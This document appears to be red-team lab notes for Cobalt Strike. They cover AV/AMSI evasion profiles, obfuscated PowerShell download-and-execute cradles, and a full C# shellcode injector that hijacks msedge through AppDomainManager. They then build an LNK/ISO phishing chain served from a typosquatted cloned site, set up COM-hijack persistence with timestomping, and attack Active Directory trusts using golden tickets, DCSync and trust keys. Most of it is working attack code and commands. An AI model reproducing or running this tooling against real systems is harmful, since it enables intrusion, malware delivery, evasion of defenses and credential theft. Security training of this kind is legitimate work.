        set spawnto_x64 "%windir%\\\\sysnative\\\\werfault.exe";
        set cleanup "true";
        set pipename "dotnet-diagnostic-#####, ########-####-####-####-############";
        set thread_hint "ntdll.dll!RtlUserThreadStart+0x2c";
        set amsi_disable "true";
    
        transform-x64 {
            strrep "This program cannot be run in DOS mode." "This is totally not a PE.";
            strrepex "PowerPick" "CLRCreateInstance failed w/hr 0x%08lx" "CLRCreateInstance failed: 0x%08lx";
            strrepex "PowerPick" "Failed to get default AppDomain w/hr 0x%08lx" "Failed to get default AppDomain: 0x%08lx";
            strrepex "ExecuteAssembly" "Invoke_3 on EntryPoint failed." "Unhandled exception.";
            strrepex "ExecuteAssembly" "Failed to load the assembly w/hr 0x%08lx" "Failed to load the assembly: 0x%08lx";
        }
    }
    process-inject {
        set allocator "VirtualAllocEx";
        set bof_allocator "VirtualAlloc";
        set bof_reuse_memory "true";
        set min_alloc "8192";
        set startrwx "false";
        set userwx "false";
    
        execute {
            CreateThread "ntdll.dll!RtlUserThreadStart+0x2c";
            NtQueueApcThread-s;
            NtQueueApcThread;
            SetThreadContext;
        }
    }


save and restart cs server
    sudo /usr/bin/docker restart cobaltstrike-cs-1
Check the container logs to ensure there are no profile errors.
    sudo /usr/bin/docker logs cobaltstrike-cs-1
<img width="759" height="561" alt="image" src="https://github.com/user-attachments/assets/46662522-4c40-4f39-87c7-6971af9852c5" />


### Artifact Kit
Launch Visual Studio Code.
Go to File > Open Folder and select C:\Tools\cobaltstrike\arsenal-kit\kits\artifact.
Navigate to src-common and open patch.c.
Scroll to line ~45 and modify the for loop. This is for the svc exe payloads.

    x = length;
    while ( x-- ) {
      * ( ( char * ) buffer + x) = * ( ( char * ) buffer + x ) ^ key [ x % 8 ];
    }

Scroll to line ~116 and modify the other for loop. This is for the normal exe payloads.

    int x = length;
    while ( x-- ) {
      * ( ( char * ) ptr + x ) = * ( ( char * ) buffer + x ) ^ key [ x % 8 ];
    }

Save the changes (File > Save) and close the folder (File > Close Folder).

On the Windows taskbar, right-click on the Terminal icon and launch Ubuntu WSL.

Change the working directory.

    cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/artifact

Run build.sh to build the new artifacts.
    ./build.sh mailslot VirtualAlloc 351363 0 false false none /mnt/c/Tools/cobaltstrike/custom-artifacts
<img width="873" height="521" alt="image" src="https://github.com/user-attachments/assets/03d8ecc0-4246-4d3d-8f38-3d934bdfc051" />

Load the Aggressor Script.
Open the Cobalt Strike client.
Go to Cobalt Strike > Script Manager.
Click Load.
Navigate to C:\Tools\cobaltstrike\custom-artifacts\mailslot and select artifact.cna.

<img width="869" height="256" alt="image" src="https://github.com/user-attachments/assets/1d547462-2e0d-4947-af68-3d419549f7d1" />


### Resource Kit
If not already open from the previous task, launch Ubuntu WSL from the Windows Terminal.

Change the working directory.

    cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/resource

Run build.sh to copy the resource templates.

    ./build.sh /mnt/c/Tools/cobaltstrike/custom-resources

<img width="879" height="365" alt="image" src="https://github.com/user-attachments/assets/9f9bdbd2-c354-40ea-a377-768cdfdddd34" />


If not already open from the previous task, launch Visual Studio Code.

Go to File > Open Folder and select C:\Tools\cobaltstrike\custom-resources.

Select template.x64.ps1.

Scroll to line 5 and replace 
    .Equals('System.dll') with .Equals('Sys'+'tem.dll').
<img width="610" height="169" alt="image" src="https://github.com/user-attachments/assets/bf11f8e5-4321-4500-8f8d-3af59e09f524" />

Scroll to line 32 and replace it with:

    $var_wpm = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll WriteProcessMemory), (func_get_delegate_type @([IntPtr], [IntPtr], [Byte[]], [UInt32], [IntPtr]) ([Bool])))
    $ok = $var_wpm.Invoke([IntPtr]::New(-1), $var_buffer, $v_code, $v_code.Count, [IntPtr]::Zero)

return
<img width="614" height="152" alt="image" src="https://github.com/user-attachments/assets/4dd8fd02-e27b-4e0f-ae64-8a9b4756dc23" />

Save the changes (File > Save).

Select compress.ps1.

Use Invoke-Obfuscation to create a unique obfuscated version, or try the following:

    SET-itEm  VarIABLe:WyizE ([tyPe]('conVE'+'Rt') ) ;  seT-variAbLe  0eXs  (  [tYpe]('iO.'+'COmp'+'Re'+'S'+'SiON.C'+'oM'+'P'+'ResSIonM'+'oDE')) ; ${s}=nEW-o`Bj`eCt IO.`MemO`Ry`St`REAM(, (VAriABle wYIze -val  )::"FR`omB`AsE64s`TriNG"("%%DATA%%"));i`EX (ne`w-`o`BJECT i`o.sTr`EAmRe`ADEr(NEw-`O`BJe`CT IO.CO`mPrESSi`oN.`gzI`pS`Tream(${s}, ( vAriable  0ExS).vALUE::"Dec`om`Press")))."RE`AdT`OEnd"();
<img width="885" height="348" alt="image" src="https://github.com/user-attachments/assets/6f707e41-9d71-49e8-93c3-2c91f0a24254" />

Save the changes (File > Save).

Open the Cobalt Strike client and load resources.cna from C:\Tools\cobaltstrike\custom-resources.
<img width="867" height="252" alt="image" src="https://github.com/user-attachments/assets/d2ccdd62-f02b-43dc-a464-9127149711fa" />

Host a 64-bit PowerShell payload.
    Go to Attacks > Scripted Web Delivery
    Select the http listener.
    Click Launch.

<img width="876" height="438" alt="image" src="https://github.com/user-attachments/assets/871a63fb-04bc-4f99-83aa-583d2781d9d8" />


Switch to Workstation and login with Passw0rd!.

Open a PowerShell window.

Download and invoke the PowerShell payload.

    iex (new-object net.webclient).downloadstring("http://www.bleepincomputer.com/a")

<img width="863" height="184" alt="image" src="https://github.com/user-attachments/assets/87a6758c-31f3-48dc-a944-92b4e0f9daff" />

Switch back to Attacker Desktop and a new Beacon should be checking in.

<img width="871" height="298" alt="image" src="https://github.com/user-attachments/assets/df29b295-f7ee-4450-862f-59bf6ffa8902" />

From the new Beacon, impersonate a local admin to lon-ws-1.

    make_token CONTOSO\rsteel Passw0rd!

Change the spawnto for the service payload.

    ak-settings spawnto_x64 C:\Windows\System32\svchost.exe

Move laterally to lon-ws-1.

    jump psexec64 lon-ws-1 smb
<img width="878" height="554" alt="image" src="https://github.com/user-attachments/assets/55a897fe-2665-4bfe-b9e8-4375fe073a6c" />

// Listener
<img width="888" height="310" alt="image" src="https://github.com/user-attachments/assets/6c2708bb-f146-4d76-9499-67db8ca77d03" />

In this lab, you have bypasses Windows Defender by modifying Cobalt Strike's default artifacts, resources, and post-exploitation behaviours.


# Thelab - initial Access 
Payload
Launch Cobalt Strike and connect to the team server.
Generate Beacon shellcode.
        Go to Payloads > Windows Stageless Payload.
        Listener: http
        Output: Raw
        Click Generate.
        Save to C:\Payloads\http_x64.xprocess.bin.

    Open a Terminal window and create a new directory to hold the dependencies for the infection chain.
        mkdir C:\Payloads\deals

    Open Visual Studio and create a new Class Library (.NET Framework) project.


<img width="996" height="569" alt="image" src="https://github.com/user-attachments/assets/14fbefc5-0f3f-4cb5-a7db-52496e197950" />

Make sure it specifically says .NET Framework, otherwise it won't work.
    Use AppDomainHijack as the project name.
    Check the place solution and project in the same directory box.

Add the shellcode to the project.

    Right-click the project in the Solution Explorer and select Add > Existing Item.
    Browse to C:\Payloads.
    Change the file filter to All Files.
    Select http_x64.xprocess.bin and click Add.

<img width="986" height="502" alt="image" src="https://github.com/user-attachments/assets/2410dbd8-4a88-4201-9025-fa0b05584d87" />

Right-click the shellcode file in the Solution Explorer and select Properties.
Set its Build Action to Embedded Resource

<img width="341" height="474" alt="image" src="https://github.com/user-attachments/assets/8260cf24-c699-4f9b-ae9b-10ae9d9036db" />

Copy the following code into Class1.cs:


    using System;
    using System.IO;
    using System.Reflection;
    using System.Runtime.InteropServices;
     
    namespace AppDomainHijack
    {
        public sealed class DomainManager : AppDomainManager
        {
            public override void InitializeNewDomain(AppDomainSetup appDomainInfo)
            {
                var si = new STARTUPINFOA
                {
                    cb = (uint)Marshal.SizeOf<STARTUPINFOA>(),
                    dwFlags = STARTUPINFO_FLAGS.STARTF_USESHOWWINDOW
                };
     
                // create hidden + suspended msedge process
                var success = CreateProcessA(
                    "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
                    "\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" --no-startup-window",
                    IntPtr.Zero,
                    IntPtr.Zero,
                    false,
                    PROCESS_CREATION_FLAGS.CREATE_NO_WINDOW | PROCESS_CREATION_FLAGS.CREATE_SUSPENDED,
                    IntPtr.Zero,
                    "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\",
                    ref si,
                    out var pi);
     
                if (!success)
                    return;
     
                // get basic process information
                var szPbi = Marshal.SizeOf<PROCESS_BASIC_INFORMATION>();
                var lpPbi = Marshal.AllocHGlobal(szPbi);
     
                NtQueryInformationProcess(
                    pi.hProcess,
                    PROCESSINFOCLASS.ProcessBasicInformation,
                    lpPbi,
                    (uint)szPbi,
                    out _);
     
                // marshal data to structure
                var pbi = Marshal.PtrToStructure<PROCESS_BASIC_INFORMATION>(lpPbi);
                Marshal.FreeHGlobal(lpPbi);
     
                // calculate pointer to image base address
                var lpImageBaseAddress = pbi.PebBaseAddress + 0x10;
     
                // buffer to hold data, 64-bit addresses are 8 bytes
                var bImageBaseAddress = new byte[8];
     
                // read data from spawned process
                ReadProcessMemory(
                    pi.hProcess,
                    lpImageBaseAddress,
                    bImageBaseAddress,
                    8,
                    out _);
     
                // convert address bytes to pointer
                var baseAddress = (IntPtr)BitConverter.ToInt64(bImageBaseAddress, 0);
     
                // read pe headers
                var data = new byte[512];
     
                ReadProcessMemory(
                    pi.hProcess,
                    baseAddress,
                    data,
                    512,
                    out _);
     
                // read e_lfanew
                var e_lfanew = BitConverter.ToInt32(data, 0x3C);
     
                // calculate rva
                var rvaOffset = e_lfanew + 0x28;
                var rva = BitConverter.ToUInt32(data, rvaOffset);
     
                // calculate address of entry point
                var lpEntryPoint = (IntPtr)((UInt64)baseAddress + rva);
     
                // read the shellcode
                byte[] shellcode;
     
                var assembly = Assembly.GetExecutingAssembly();
     
                using (var rs = assembly.GetManifestResourceStream("AppDomainHijack.http_x64.xprocess.bin"))
                {
                    // convert stream to raw byte[]
                    using (var ms = new MemoryStream())
                    {
                        rs.CopyTo(ms);
                        shellcode = ms.ToArray();
                    }
                }
     
                // copy shellcode into address of entry point
                WriteProcessMemory(
                    pi.hProcess,
                    lpEntryPoint,
                    shellcode,
                    shellcode.Length,
                    out _);
     
                // resume process
                ResumeThread(pi.hThread);
            }
     
            [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true, CharSet = CharSet.Ansi)]
            [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
            private static extern bool CreateProcessA(
                string applicationName,
                string commandLine,
                IntPtr processAttributes,
                IntPtr threadAttributes,
                bool inheritHandles,
                PROCESS_CREATION_FLAGS creationFlags,
                IntPtr environment,
                string currentDirectory,
                ref STARTUPINFOA startupInfo,
                out PROCESS_INFORMATION processInformation);
     
            [DllImport("ntdll.dll", ExactSpelling = true)]
            [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
            private static extern uint NtQueryInformationProcess(
                IntPtr processHandle,
                PROCESSINFOCLASS processInformationClass,
                IntPtr processInformation,
                uint processInformationLength,
                out uint returnLength);
     
            [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
            [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
            private static extern bool ReadProcessMemory(
                IntPtr processHandle,
                IntPtr baseAddress,
                byte[] buffer,
                UInt64 size,
                out uint numberOfBytesRead);
     
            [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
            [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
            private static extern bool WriteProcessMemory(
                IntPtr processHandle,
                IntPtr baseAddress,
                byte[] buffer,
                int size,
                out int numberOfBytesWritten);
     
            [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
            [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
            private static extern uint ResumeThread(IntPtr threadHandle);
        }
     
        [Flags]
        public enum PROCESS_CREATION_FLAGS : uint
        {
            DEBUG_PROCESS = 0x00000001,
            DEBUG_ONLY_THIS_PROCESS = 0x00000002,
            CREATE_SUSPENDED = 0x00000004,
            DETACHED_PROCESS = 0x00000008,
            CREATE_NEW_CONSOLE = 0x00000010,
            NORMAL_PRIORITY_CLASS = 0x00000020,
            IDLE_PRIORITY_CLASS = 0x00000040,
            HIGH_PRIORITY_CLASS = 0x00000080,
            REALTIME_PRIORITY_CLASS = 0x00000100,
            CREATE_NEW_PROCESS_GROUP = 0x00000200,
            CREATE_UNICODE_ENVIRONMENT = 0x00000400,
            CREATE_SEPARATE_WOW_VDM = 0x00000800,
            CREATE_SHARED_WOW_VDM = 0x00001000,
            CREATE_FORCEDOS = 0x00002000,
            BELOW_NORMAL_PRIORITY_CLASS = 0x00004000,
            ABOVE_NORMAL_PRIORITY_CLASS = 0x00008000,
            INHERIT_PARENT_AFFINITY = 0x00010000,
            INHERIT_CALLER_PRIORITY = 0x00020000,
            CREATE_PROTECTED_PROCESS = 0x00040000,
            EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
            PROCESS_MODE_BACKGROUND_BEGIN = 0x00100000,
            PROCESS_MODE_BACKGROUND_END = 0x00200000,
            CREATE_SECURE_PROCESS = 0x00400000,
            CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
            CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
            CREATE_DEFAULT_ERROR_MODE = 0x04000000,
            CREATE_NO_WINDOW = 0x08000000,
            PROFILE_USER = 0x10000000,
            PROFILE_KERNEL = 0x20000000,
            PROFILE_SERVER = 0x40000000,
            CREATE_IGNORE_SYSTEM_DEFAULT = 0x80000000
        }
     
        public struct STARTUPINFOA
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public STARTUPINFO_FLAGS dwFlags;
            public ushort wShowWindow;
            public ushort cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }
     
        [Flags]
        public enum STARTUPINFO_FLAGS : uint
        {
            STARTF_FORCEONFEEDBACK = 0x00000040,
            STARTF_FORCEOFFFEEDBACK = 0x00000080,
            STARTF_PREVENTPINNING = 0x00002000,
            STARTF_RUNFULLSCREEN = 0x00000020,
            STARTF_TITLEISAPPID = 0x00001000,
            STARTF_TITLEISLINKNAME = 0x00000800,
            STARTF_UNTRUSTEDSOURCE = 0x00008000,
            STARTF_USECOUNTCHARS = 0x00000008,
            STARTF_USEFILLATTRIBUTE = 0x00000010,
            STARTF_USEHOTKEY = 0x00000200,
            STARTF_USEPOSITION = 0x00000004,
            STARTF_USESHOWWINDOW = 0x00000001,
            STARTF_USESIZE = 0x00000002,
            STARTF_USESTDHANDLES = 0x00000100
        }
     
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public uint dwProcessId;
            public uint dwThreadId;
        }
     
        public enum PROCESSINFOCLASS
        {
            ProcessBasicInformation = 0
        }
     
        public struct PROCESS_BASIC_INFORMATION
        {
            public uint ExitStatus;
            public IntPtr PebBaseAddress;
            public ulong AffinityMask;
            public int BasePriority;
            public ulong UniqueProcessId;
            public ulong InheritedFromUniqueProcessId;
        }
    }

<img width="996" height="582" alt="image" src="https://github.com/user-attachments/assets/fa74f41e-d5c2-45cb-be5e-e38d9f3f9da4" />

Release & build 

<img width="1017" height="445" alt="image" src="https://github.com/user-attachments/assets/c450f74c-f599-4668-b6a3-060a27cd8712" />

Go ahead and copy the DLL to the deals payload directory.
<img width="996" height="116" alt="image" src="https://github.com/user-attachments/assets/e044a46d-d29e-4ff4-8cf1-3183ecdd081f" />

### NGenTask
Copy the SxS version of ngentask.exe into the deals payload directory.

    cp C:\Windows\WinSxS\amd64_netfx4-ngentask_exe_b03f5f7f11d50a3a_4.0.15805.0_none_d4039dd5692796db\ngentask.exe C:\Payloads\deals\

Move into the deals payload directory and set the AppDomain environment variables:

    cd C:\Payloads\deals
    $env:APPDOMAIN_MANAGER_TYPE = 'AppDomainHijack.DomainManager'
    $env:APPDOMAIN_MANAGER_ASM = 'AppDomainHijack, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null'
<img width="970" height="335" alt="image" src="https://github.com/user-attachments/assets/758362c6-de66-41bb-af42-54568f699356" />

A new Beacon should appear, running in msedge.exe.

<img width="1001" height="454" alt="image" src="https://github.com/user-attachments/assets/7261b755-5139-44fb-b9fc-dc3ce32bee7e" />

### Decoy

Next, create a decoy file.
Open Excel and create a new blank workbook.
If you cannot create a workbook, close Excel, launch Terminal as a local admin, and run the following command: 
    & "C:\Program Files\Microsoft Office\root\Office16\OSPPREARM.EXE"

Add some dummy deals data.

    xlsx
    TypeCopy
    id  product      discount  code
    1   Prodder      56%       54473-150
    2   Viva         9%        0378-5713
    3   Aerified     22%       43742-0187
    4   Zaam-Dox     26%       35356-687
    5   Rank         41%       63323-300
    6   Pannier      61%       50804-302
    7   Wrapsafe     32%       67046-223
    8   Voltsillam   58%       55910-721
    9   Ventosanzap  4%        0485-0051
    10  Otcom        54%       36987-2281

Save the workbook as C:\Payloads\deals\deals.xlsx.
Close Excel.

### Trigger

Now for the trigger. The user will run this which will subsequently launch the decoy and payload at the same time.
Generate a PowerShell one-liner that will set the required environment variables and execute ngentask.exe.
    cd C:\Payloads\deals\
    $cmd = '$env:APPDOMAIN_MANAGER_TYPE = "AppDomainHijack.DomainManager"; $env:APPDOMAIN_MANAGER_ASM = "AppDomainHijack, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null"; .\ngentask.exe'
    $enc = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($cmd))

In the same window, create the shortcut that will execute the above one-liner and open the decoy.

    $wsh = New-Object -ComObject WScript.Shell
    $lnk = $wsh.CreateShortcut("C:\Payloads\deals\deals.xlsx.lnk")
    $lnk.TargetPath = "%COMSPEC%"
    $lnk.Arguments = "/C start deals.xlsx && %SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -enc $enc"
    $lnk.IconLocation = "%ProgramFiles%\Microsoft Office\root\Office16\EXCEL.EXE,0"
    $lnk.Save()


<img width="978" height="476" alt="image" src="https://github.com/user-attachments/assets/dd53dbb9-678b-445a-89b8-b984f8121881" />

make sure the payload is save

<img width="766" height="290" alt="image" src="https://github.com/user-attachments/assets/7f11aca2-3564-4fb6-8de9-69a1fb2b8e67" />

<img width="841" height="128" alt="image" src="https://github.com/user-attachments/assets/27fac34c-e501-4fd9-aed9-cafb32a0451c" />

Open Explorer and navigate to C:\Payloads\deals.

Double-click on deals.xlsx.lnk.

    The spreadsheet will open and a new Beacon should appear at the same time.

<img width="990" height="556" alt="image" src="https://github.com/user-attachments/assets/e2531c01-a697-4582-873c-6d649bab5c2c" />

It's time to package all of our files. We want to hide everything, except the lnk trigger.

    Open Ubuntu (WSL) in Terminal, and use PackMyPayload to package all the files into an ISO.

    ubuntu
    TypeCopy
    python3 /mnt/c/Tools/PackMyPayload/PackMyPayload.py -H deals.xlsx,ngentask.exe,AppDomainHijack.dll /mnt/c/Payloads/deals/ /mnt/c/Payloads/deals/deals.iso

Final sanity test

    Double-click on the ISO to mount it and you should only see the trigger.
    Double-click on the trigger a final time, and the decoy and Beacon should appear.

Delivery

We're finally ready to deliver the payload to the victim.
Host the ISO on Cobalt Strike's built-in web server.
Go to Site Management > Host File.
    File: C:\Payloads\deals\deals.iso
    Local URI: /deals.iso
    Local Host: www.bleepincomputer.com
    Click Launch.
<img width="1008" height="569" alt="image" src="https://github.com/user-attachments/assets/c5a0bac1-1798-47e5-943f-af8195f5f82b" />

Clone a legitimate web page.
Go to Site Management > Clone Site
    Clone URL: https://deals.bleepingcomputer.com
    Local URI: /deals
    Local Host: www.bleepincomputer.com
    Attack: Click the … button and select the hosted ISO.
    Click Clone.

<img width="390" height="408" alt="image" src="https://github.com/user-attachments/assets/35a4183b-e9c0-46b7-a038-55cf3e4fbfcc" />


download iso

<img width="1054" height="664" alt="image" src="https://github.com/user-attachments/assets/085a3350-b851-4fff-b395-bbbcb9609463" />
Switch over to Workstation 1 and login with Passw0rd!.

Open Microsoft Edge and browse to http://www.bleepincomputer.com/deals

Click Open file when deals.iso downloads.

Double-click on deals.xlsx and the decoy will open.

Switch back to Attacker Desktop and a Beacon should be checking in from msedge.exe, as the user pchilds.

    In this lab you have created an initial access infection chain, leveraging DLL sideloading with ngentask.exe.
<img width="994" height="518" alt="image" src="https://github.com/user-attachments/assets/3d7f2095-b176-46d0-bc59-58f23c15a7ae" />


# Persistence Lab
Generate a DLL payload:

    Payloads > Windows Stageless Payload
    Listener: http
    Output: Windows DLL
    Exit Function: Thread
    Click Generate.
    Save it to C:\Payloads\http_x64.dll.

We choose Thread as the exit function because this DLL will be loaded into a process that we don't want to have killed if we exit the Beacon.

COM Hijack

From the Beacon running as pchilds:
Change Beacon's working directory.

    cd C:\Users\pchilds\AppData\Local\Microsoft\TeamsMeetingAdd-in\1.25.14205\x64

Upload the DLL payload to disk.
    upload C:\Payloads\http_x64.dll

Rename and timestomp the DLL to help it blend in with the existing files.
        mv http_x64.dll Microsoft.Teams.HttpClient.dll
        timestomp Microsoft.Teams.HttpClient.dll Microsoft.Teams.Diagnostics.dll

Add the registry entries to perform the COM hijack:

    reg_set HKCU "Software\Classes\CLSID\{7D096C5F-AC08-4F1F-BEB7-5C22C517CE39}\InprocServer32" "" REG_EXPAND_SZ "%LocalAppData%\Microsoft\TeamsMeetingAdd-in\1.25.14205\x64\Microsoft.Teams.HttpClient.dll"
    reg_set HKCU "Software\Classes\CLSID\{7D096C5F-AC08-4F1F-BEB7-5C22C517CE39}\InprocServer32" "ThreadingModel" REG_SZ "Both"

Switch to Workstation 1 and login with Passw0rd!.
From the Windows start menu, launch Microsoft Teams.
Switch back to the Attacker Desktop and a new Beacon should appear from ms-teams.exe.
In this lab, you have leveraged COM hijacking to force a trusted, signed Microsoft application to load and run a Beacon payload for persistence.



# Parent-child Trust
    ldapsearch (objectClass=trustedDomain) --attributes trustPartner,trustDirection,trustAttributes,flatName
What do these results mean?

    trustDirection 3 is TRUST_DIRECTION_BIDIRECTIONAL
    trustAttributes 32 is TRUST_ATTRIBUTE_WITHIN_FOREST

Obtain the domain SID for the child domain.

    ldapsearch (objectClass=domain) --hostname dub-dc-1 --dn DC=dublin,DC=contoso,DC=com --attributes objectSid

This should return S-1-5-21-690277740-3036021016-2883941857.

Obtain the SID for parent domain's Enterprise Admins group.

    ldapsearch "(&(samAccountType=268435456)(samAccountName=Enterprise Admins))" --hostname lon-dc-1 --dn DC=contoso,DC=com --attributes objectSid

This should return S-1-5-21-3926355307-1661546229-813047887-519.
Impersonate the sguest user.
using:
    krb_triage
    krb_dump  /user:sguest /service:krbtgt
This user is a domain admin in the child domain.
Obtain the AES256 hash for the child domain's krbtgt account.
    dcsync dublin.contoso.com DUBLIN\krbtgt
    
### Exploitation
On the Attacker Desktop, forge a golden ticket and output to a kirbi file.

    C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /user:Administrator /domain:dublin.contoso.com /sid:S-1-5-21-690277740-3036021016-2883941857 /sids:S-1-5-21-3926355307-1661546229-813047887-519 /aes256:2eabe80498cf5c3c8465bb3d57798bc088567928bb1186f210c92c1eb79d66a9 /outfile:C:\Users\Attacker\Desktop\golden

Inject the ticket into the Beacon session.

    kerberos_ticket_use C:\Users\Attacker\Desktop\[GOLDEN TICKET]

This will replace the current TGT for sguest.

Verify the ticket is in the session.
        run klist 

Access the parent domain's domain controller.
        ls \\lon-dc-1\c$

In this lab, you have forged a golden ticket using SID history to impersonate an enterprise admin, and hop a parent-child trust.

### Inbound Trust Lab
Enumeration

Enumerate information about the trust.

    Launch Cobalt Strike and connect to the team server.

    Interact with the medium-integrity Beacon and enumerate the trust.


    ldapsearch (objectClass=trustedDomain) --attributes trustDirection,trustPartner,trustAttributes,flatname

        What do these results mean?
            trustDirection 1 is TRUST_DIRECTION_INBOUND
            trustAttributes 8 is TRUST_ATTRIBUTE_FOREST_TRANSITIVE

    Enumerate the Foreign Security Principals Container of the foreign domain.

    ldapsearch (objectClass=foreignSecurityPrincipal) --attributes objectSid,memberOf --hostname partner.com --dn DC=partner,DC=com

        This will show that the SID S-1-5-21-3926355307-1661546229-813047887-6102, which is an object current domain, is a member of a "Contoso Users" group in the foreign domain.

    Identify what that local SID is.


    ldapsearch (objectSid=S-1-5-21-3926355307-1661546229-813047887-6102) --attributes samAccountType,distinguishedName

        This output shows that it's a domain group called "Partner Jump Users".

    Enumerate members of that group.


    ldapsearch "(&(|(samAccountType=805306368)(samAccountType=268435456))(memberof=CN=Partner Jump Users,CN=Users,DC=contoso,DC=com))" --attributes distinguishedName

        This will return any users or groups that are members of "Partner Jump Users".

    Find a domain controller in the foreign domain.


    nslookup _ldap._tcp.dc._msdc


Discovery

Enumerate the foreign domain to find where members of the "Contoso Users" group may have privileged access.

    List GPOs.
    
    ldapsearch (objectClass=groupPolicyContainer) --hostname par-dc-1.partner.com --dn DC=partner,DC=com --attributes displayName,gPCFileSysPath

        This will reveal a GPO called "Contoso Jump Users"

    Download the GPO's GptTmpl.inf file.

    download \\partner.com\SysVol\partner.com\Policies\{DFE606B4-CA59-4AD6-9BCE-55AF35888129}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf

    Sync it to your Attacker desktop and open it in Notepad.

        It will show that the SID S-1-5-21-4244029708-1901239654-2578485347-1104 is a member of S-1-5-32-544, which is the local administrators group.

    You can confirm that this is the "Contoso Users" group and that it has the SID from CONTOSO, S-1-5-21-3926355307-1661546229-813047887-6102, is a member.

    ldapsearch (objectSid=S-1-5-21-4244029708-1901239654-2578485347-1104) --hostname par-dc-1.partner.com --dn DC=partner,DC=com --attributes samAccountType,samAccountName,member

    Find where that GPO is linked.

    ldapsearch (&(|(objectClass=organizationalUnit)(objectClass=domain))(gPLink=*{DFE606B4-CA59-4AD6-9BCE-55AF35888129}*)) --hostname par-dc-1.partner.com --dn DC=partner,DC=com --attributes objectClass,name

        This will reveal that GPO is linked to the entire top-level domain.

    Find what computers exist in the foreign domain.

    ldapsearch (samAccountType=805306369) --hostname par-dc-1.partner.com --dn DC=partner,DC=com --attributes distinguishedName

### Exploitation

Use the high-integrity Beacon to impersonate the dyork user (who is a domain admin in the current domain).
DCSync rsteel's AES256 hash.
    dcsync contoso.com CONTOSO\rsteel
Obtain a TGT for rsteel.
    krb_triage
    krb_dump /user:  /service:
    [IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\rsteel.kirbi", [Convert]::FromBase64String("ticketBase64"))
    krb_asktgt /user:rsteel /aes256:05579261e29fb01f23b007a89596353e605ae307afcd1ad3234fa12f94ea6960

Use the TGT to request an inter-realm referral ticket.

    krb_asktgs /service:krbtgt/partner.com /ticket:[TGT]

Use the inter-realm ticket to request a service ticket for CIFS on par-jmp-1.
    
    krb_asktgs /service:cifs/par-jmp-1.partner.com /targetdomain:partner.com /dc:par-dc-1.partner.com /ticket:[INTER-REALM]

Use the service ticket to access the service in the trusting domain.
    ls \\par-jmp-1.partner.com\c$

In this lab, you have taken advantage of legit access assigned across a one-way inbound trust.

### Outbond Trust
Interact with Beacon and enumerate the trust.
    ldapsearch (objectClass=trustedDomain) --attributes trustDirection,trustPartner,trustAttributes,flatName

What do these results mean?
trustDirection 2 is TRUST_DIRECTION_OUTBOUND.
trustAttributes 8 is TRUST_ATTRIBUTE_FOREST_TRANSITIVE.

Get the GUID of the TDO.
    ldapsearch (objectClass=trustedDomain) --attributes name,objectGUID
Inject a Beacon payload into a vwebber process.
    procesess_browser
    <img width="1015" height="365" alt="image" src="https://github.com/user-attachments/assets/eb3c4f7b-fb3c-4528-a4b7-76bec5ee6edc" />
find explorer/scvhost, inject to tcp-local
    <img width="685" height="338" alt="image" src="https://github.com/user-attachments/assets/085bea2a-3be5-469d-92b3-298214652028" />

Use the new Beacon to dcsync the shared inter-realm key from the TDO.

    mimikatz lsadump::dcsync /domain:partner.com /guid:{288d9ee6-2b3c-42aa-bef8-959ab4e484ed}

Request a TGT for the trust account using the shared secret.
    krb_asktgt /user:PARTNER$ /rc4:[TRUST KEY] /domain:contoso.com /dc:lon-dc-1.contoso.com

Inject the TGT into a sacrificial logon session.

Enumerate the trusted domain.
    ldapsearch (objectClass=domain) --hostname contoso.com --dn DC=contoso,DC=com --attributes name,objectSid


In this lab, you have learned how to abuse the trust account to obtain a usable TGT for the foreign domain. These can be used to find potential vulnerabilities, such as kerberoastable accounts.



